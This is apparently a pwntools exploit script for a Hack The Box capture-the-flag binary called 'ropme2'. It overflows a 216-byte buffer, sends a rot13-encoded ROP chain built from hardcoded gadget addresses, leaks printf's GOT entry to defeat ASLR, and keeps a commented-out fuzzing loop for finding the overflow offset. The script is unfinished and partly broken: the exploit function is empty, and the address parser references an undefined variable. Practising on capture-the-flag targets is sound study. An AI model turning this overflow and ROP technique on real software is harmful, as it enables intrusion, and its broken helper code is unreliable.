#!/usr/bin/python

from pwn import *
import string
import re
import time

BINARY = './ropme2'
BUFFSIZE = 216
CONTEXT = 'INFO'

pop_rdi = p64(0x40142b)
pop_rsi = p64(0x401429)
pop_rax = p64(0x401162)
pop_rdx = p64(0x401164)
read_addr = p64(0x4033f0)
syscall = p64(0x401168)
dynamic = p64(0x4031e8)

def rot13(pay):
    newpayload = ''
    for i in range(len(pay)):
        if pay[i] in string.ascii_lowercase:
            temp = string.ascii_lowercase[(string.ascii_lowercase.index(pay[i]) + 13) % len(string.ascii_lowercase)]
        elif pay[i] in string.ascii_uppercase:
            temp = string.ascii_uppercase[(string.ascii_uppercase.index(pay[i]) + 13) % len(string.ascii_uppercase)]
        else:
            temp = pay[i]
        newpayload+=temp
    return newpayload

def parse_addr(message):
    re.findall(r'0x[a-f0-9]*\n',message)[0].strip()
    log.info("Debug str is at {}".format(address))
    print(address)

def get_debug(process):
    # Sending DEBUG prints a nice address for us
    payload = "DEBUG"
    process.sendline(payload)
    logit(payload+"\x00\n")
    message = process.recvuntil("me\n")
    print(message)
    address = parse_addr(message)
    return int(address,0)

def leak(proc):
    fill = "A"*(BUFFSIZE)
    
    #address = get_debug(proc)

    payload = fill +\
            rot13(pop_rdi) + p64(binary.got['printf']) +\
            p64(binary.symbols['plt.printf']) + p64(0x401080) 


    log.info("Sending payload\n{}".format(payload))
    proc.sendline(payload)
    logit(payload+"\x00\n")
    addr = proc.recvuntil("me").split('Please')[0][::-1].encode('hex')
    print(addr)

def overflow(proc,num):
    try:
        data = cyclic(num)
        proc.sendline(data)
        exit_code = proc.poll(block=True)
        if exit_code is not None and exit_code < -1:
            print("Exit code: {} on {}".format(exit_code,num))
            raise
    except Exception as e:
        log.critical("Broke on input:\n{}".format(data))
        print("Broken")
        raise e
    pass

def exploit():
    pass

def logit(data):
    with open("payload","ab") as f:
        f.write(data)

def setup():
    global binary
    binary = ELF(BINARY)
    with open("payload","wb") as f:
        pass

    if CONTEXT is not None:
        context.log_level=CONTEXT

def main():
    setup()
    '''
    for i in range(200,250):
        p = process(BINARY,alarm=2)
        overflow(p,i)
        p.close()
    '''
    p = process(BINARY)
    #p = remote("docker.hackthebox.eu",44517)
    print(p.recvuntil("me\n"))
    leak(p)
    p.close()

if __name__ == '__main__':
    main()
